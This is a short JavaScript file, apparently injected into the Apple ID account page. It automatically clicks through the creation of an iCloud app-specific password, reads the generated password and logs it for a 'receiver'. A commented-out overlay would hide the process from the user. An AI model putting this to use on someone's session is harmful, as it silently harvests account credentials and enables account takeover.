window.onload = autoProcess;

function autoProcess() {
  if (window.location.href !== 'https://appleid.apple.com/account/manage') {
    console.log('***return');
    return;
  }
  console.log('****autoProcess');
  //   var maskDiv = $('<div>Please wait...</div>').css({
  //     width: '100%',
  //     height: '100%',
  //     position: 'fixed',
  //     background: '#fff',
  //     left: 0,
  //     top: 0,
  //     zIndex: 999,
  //     textAlign: 'center',
  //     fontSize: '40px',
  //   });
  //   maskDiv.appendTo('body');

  if (!$('.btn-app-password')) {
    console.log('***retry');
    setTimeout(autoProcess, 100);
    return;
  }
  $('.btn-app-password').trigger('click');
  setTimeout(() => {
    $('.generic-input-field').attr('value', 'good-for-you');
    $('.generic-input-field').trigger('change');
    $('.button-primary').trigger('click');
    intervalCheckPassword();
  }, 1000);

  var timer;
  function intervalCheckPassword() {
    timer = setInterval(() => {
      var el = $('#appPasswordText');
      if (el && el.val()) {
        clearInterval(timer);
        // send the message to the receiver
        console.log('icloud:' + el.val());
      }
    }, 100);
  }
}
